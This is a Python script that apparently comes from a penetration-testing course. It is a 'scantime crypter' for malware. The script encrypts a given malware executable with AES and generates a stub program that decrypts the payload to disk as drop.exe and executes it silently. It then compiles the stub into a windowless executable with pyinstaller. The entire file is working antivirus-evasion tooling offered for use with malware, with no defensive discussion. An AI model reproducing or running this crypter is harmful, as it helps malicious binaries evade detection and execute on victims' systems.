######################################################################
## Pentest Profissional Solyd - Guilherme Junqueira                 ##
## https://solyd.com.br/treinamentos                                ##
##                                                                  ##
## Usage: python scantime_py_crypter.py <malware_path/malware.exe>  ##
######################################################################


import binascii
import pyaes
import sys

# Open file
file_name = sys.argv[1] # Malware path
new_file_name = "drop.exe"  # Path to drop file
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Crypt file data (Using AES)
key = "0123456789abcdef"  # 16 bytes key - change for your key
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
crypto_data_hex = binascii.hexlify(crypto_data)

# Create Stub in Python File
stub = "import pyaes\n"
stub += "crypto_data_hex = \"" + crypto_data_hex + "\"\n"
stub += "key = \"" + key + "\"\n"
stub += "new_file_name = \"" + new_file_name + "\"\n"
stub += """
# Decrypt
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = crypto_data_hex.decode('hex')
decrypt_data = aes.decrypt(crypto_data)

# Save file
new_file = open(new_file_name, 'wb')
new_file.write(decrypt_data)
new_file.close()

# Execute file
import subprocess
proc = subprocess.Popen(new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""

# Save the Stub
stub_name = "stub.py"
stub_file = open(stub_name, "w")
stub_file.write(stub)
stub_file.close()

# Convert py to exe with pyinstaller
import os
os.system("pyinstaller -F -w --clean " + stub_name)


